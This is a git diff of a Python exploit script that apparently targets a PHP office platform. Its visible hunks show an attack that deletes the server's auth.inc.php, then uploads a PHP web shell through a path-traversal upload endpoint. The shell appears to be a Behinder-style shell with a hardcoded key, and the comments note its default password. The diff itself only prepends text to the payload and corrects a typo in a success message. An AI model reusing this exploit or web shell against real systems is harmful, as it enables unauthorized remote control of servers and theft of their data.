@@ -7,7 +7,7 @@ console = Console()
 def now_time():
     return time.strftime("[%H:%M:%S] ", time.localtime())
 
-payload='''<?php
+payload='''hello<?php
 @error_reporting(0);
 session_start();
     $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
@@ -51,7 +51,7 @@ def main(target_url):
         if 'No input file specified.' not in response.text:
             console.print(now_time() + " [WARNING]  删除auth.inc.php失败", style='bold red')
         else:
-            console.print(now_time() + ' [SUCCESS]  删除auth.inc.php成果，正在上传', style='bold green')
+            console.print(now_time() + ' [SUCCESS]  删除auth.inc.php成功，正在上传', style='bold green')
             exp_url=target_url+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
             files={'FILE1': ('index123.php', payload)}
             requests.post(exp_url,files=files,verify=False)
